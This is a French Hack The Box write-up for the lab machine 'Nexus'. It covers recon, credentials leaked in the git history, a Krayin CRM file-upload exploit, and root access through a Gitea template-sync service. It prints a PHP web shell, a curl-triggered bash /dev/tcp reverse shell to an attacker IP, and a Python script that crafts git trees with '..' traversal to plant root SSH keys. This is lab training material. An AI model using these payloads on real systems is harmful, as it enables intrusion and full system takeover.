---
title: "Hack The Box — Nexus : Writeup"
date: 2026-10-17 00:00:00 +0200
categories: [Box, HackTheBox]
tags: [web, osint, gobuster, vhost-enumeration, gitea, krayin-crm, cve-2026-38526, rce, reverse-shell, privesc, systemd-timer, python, linux, HackTheBox]
description: "Résolution de la machine Nexus sur Hack The Box : énumération des sous-domaines, exploitation de Krayin CRM, accès via Gitea, et élévation de privilèges via un service systemd vulnérable."
image:
  path: /assets/img/htb/nexus/nexus-banner.png
  alt: nexus Banner
  
---

# Hack The Box — Nexus

## Informations sur la machine

* **Cible** : `10.129.234.54`
* **Système d'exploitation** : Linux
* **Difficulté** : Easy

## 1. Reconnaissance avec Nmap

Je commence par une phase d'énumération avec Nmap afin de trouver les ports et les services accessibles.

J'utilise donc :

```bash
nmap -sC -sV 10.129.234.54
```

**Résultat :**

![nmap resultat](/assets/img/htb/nexus/nmap_resultat.png)

À la sortie, on constate que deux ports sont ouverts :

| Port | Service |
| ---- | ------- |
| 22   | ssh     |
| 80   | http    |

Notre priorité sera donc le port 80. On en déduit donc qu'il y a un serveur web.

---

## 2. Découverte du site Web

Dans le navigateur, je tape : `http://10.129.234.54` et ça me dirige vers une page `http://nexus.htb`.

![home page](/assets/img/htb/nexus/home_page.png)

En inspectant le code source, on tombe sur deux adresses mail notamment celui du manager qui est : `j.matthew@nexus.htb`.

![Mail manager](/assets/img/htb/nexus/mail_source.png)

---

## 3. Énumération des sous-domaines avec Gobuster

Par la suite, je lance une énumération des sous-domaines avec Gobuster :

```bash
gobuster vhost -u http://nexus.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

On obtient deux résultats :

* `billing.nexus.htb`
* `git.nexus.htb`

![Enumération sous-domaines](/assets/img/htb/nexus/subdomain.png)

---

## 4. Exploration du dépôt Git

Je navigue donc vers `http://git.nexus.htb` puis je tombe sur un dépôt.

![Dépôt](/assets/img/htb/nexus/repo.png)

Je décide donc de fouiller dans le `.env` puis je tombe sur un champ `DB_PASSWORD` vide.

![DB PASSWORD vide](/assets/img/htb/nexus/db_pwd_v.png)

Je décide donc de chercher et je constate que le dépôt a été modifié. Ainsi, en fouillant dans les commits, je tombe sur le mot de passe de la base de données :

```text
N27xh!!2ucY04
```

![Commits](/assets/img/htb/nexus/commits.png)

![DB PASSWORD](/assets/img/htb/nexus/db_pwd.png)

---

## 5. Connexion à Krayin CRM

Puis, je me dirige vers `http://billing.nexus.htb` et je tombe sur une page de login de **Krayin CRM**.

![login](/assets/img/htb/nexus/login.png)

Je me connecte en utilisant les identifiants `j.matthew@nexus.htb:N27xh!!2ucY04`, ce qui me donne accès à un dashboard.

![dashboard](/assets/img/htb/nexus/dashboard.png)

Puis, en fouillant le code source, on constate que la version de Krayin CRM utilisée est la **2.2.0**.

![version](/assets/img/htb/nexus/version.png)

---

## 6. Recherche et découverte de la vulnérabilité

En cherchant, on trouve le **CVE-2026-38526** lié à cette version, sur [https://www.exploit-db.com/exploits/52629](https://www.exploit-db.com/exploits/52629).

Afin de l'exploiter, on écrit un petit script PHP :

```php
<?php system($_GET["cmd"]); ?>
```

En lisant le script, on constate qu'on a besoin de fournir le mail et le mot de passe de l'utilisateur.

---

## 7. Tentative d'exploitation et contournement

Lorsqu'on utilise les identifiants `j.matthew@nexus.htb:N27xh!!2ucY04`, ça ne fonctionne pas :

![echec script](/assets/img/htb/nexus/echec.png)

Je me suis donc rendu à l'URL `http://billing.nexus.htb/admin/settings/users` afin de modifier le mot de passe de l'utilisateur `james` en `james1234`.

![update mdp](/assets/img/htb/nexus/change.png)

En relançant le script, ça a fonctionné :

![succes script](/assets/img/htb/nexus/success.png)

---

## 8. Obtention d'un reverse shell

Par la suite, on lance un listener avec :

```bash
nc -lvnp 4444
```

Et en parallèle, on lance :

```bash
curl -G "http://billing.nexus.htb/storage/tinymce/efa88852ad27a78dd6d8dd3ba4a281d4.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.108/4444 0>&1'"
```

Ce qui nous permet d'obtenir un reverse shell, qu'on stabilise avant tout :

![reverse shell](/assets/img/htb/nexus/reverse.png)

Nous sommes donc connectés en tant que `www-data`.

Il existe un répertoire `jones`, mais nous n'avons pas les permissions nécessaires pour y accéder.

---

## 9. Récupération des identifiants et accès utilisateur

Ainsi, en fouillant dans les fichiers de configuration en vain, j'essaie de trouver le fichier `.env` à l'aide de `find` et de l'ouvrir.

Je tombe donc sur un `DB_PASSWORD` différent de celui trouvé sur Gitea :

```text
y27xb3ha!!74GbR
```

![identifiants](/assets/img/htb/nexus/id.png)

En utilisant `su`, j'arrive à me connecter avec ce mot de passe. Ainsi, j'utilise `cat user.txt` afin de trouver le flag :

```text
81**************************eadd
```

---

## 10. Énumération des services actifs

Par la suite, en utilisant :

```bash
systemctl list-timers
```

On constate que le service `gitea-template-sync.service` est actif sur la machine. Ce service sert à synchroniser automatiquement les dépôts créés à partir de templates dans Gitea.

Puis, en tapant :

```bash
gitea --version
```

On découvre que la version de ce service est **1.26.0**.

Puis, en utilisant :

```bash
systemctl cat gitea-template-sync.service
```

On tombe sur quelque chose d'intéressant :

![lire service](/assets/img/htb/nexus/cat_service.png)

Ce service exécute un script Python en tant que `root` pour synchroniser les templates de Gitea.

---

## 11. Exploitation du service gitea-template-sync

Par la suite, je me connecte sur Gitea avec les identifiants `j.matthew@nexus.htb:y27xb3ha!!74GbR`.

![connexion gitea](/assets/img/htb/nexus/connexion.png)

Puis je crée un dépôt template.

![template 1](/assets/img/htb/nexus/template_1.png)

![template 2](/assets/img/htb/nexus/template_2.png)

Puis, sur ma machine, je tape les commandes suivantes :

![generation clés ssh](/assets/img/htb/nexus/ssh_generate.png)

![git_clone](/assets/img/htb/nexus/git_clone.png)

![Les commandes 1](/assets/img/htb/nexus/cmd_1.png)

![Les commandes 2](/assets/img/htb/nexus/cmd_2.png)

```python
#!/usr/bin/env python3
import hashlib,zlib,os,subprocess,sys,time

def write_obj(data,t):
    h=("%s %d"%(t,len(data))).encode()+b"\x00"
    s=h+data
    sha=hashlib.sha1(s).hexdigest()
    d=os.path.join(".git","objects",sha[:2])
    os.makedirs(d,exist_ok=True)
    p=os.path.join(d,sha[2:])
    if not os.path.exists(p):
        open(p,"wb").write(zlib.compress(s))
    return sha

def entry(mode,name,sha):
    return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)

if not os.path.isdir(".git"):
    print("Run inside git repo");sys.exit(1)

r=subprocess.run(["cat","/tmp/.k.pub"],capture_output=True,text=True)
if r.returncode!=0:
    print("ssh-keygen -t ed25519 -f /tmp/.k -N ''");sys.exit(1)
key=r.stdout.strip()+"\n"

blob=write_obj(key.encode(),"blob")
readme=write_obj(b"# Template\n","blob")
ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
fir=write_obj(entry("40000","root",cur),"tree")
for i in range(4):
    fir=write_obj(entry("40000","..",fir),"tree")
root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
ts=int(time.time())
c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
sha=write_obj(c.encode(),"commit")
os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
print("Done: "+sha)

```

---

## 12. Récupération du flag root

**Flag root :**

```text
78**************************b5f5
```

La compromission complète de la machine est désormais terminée.
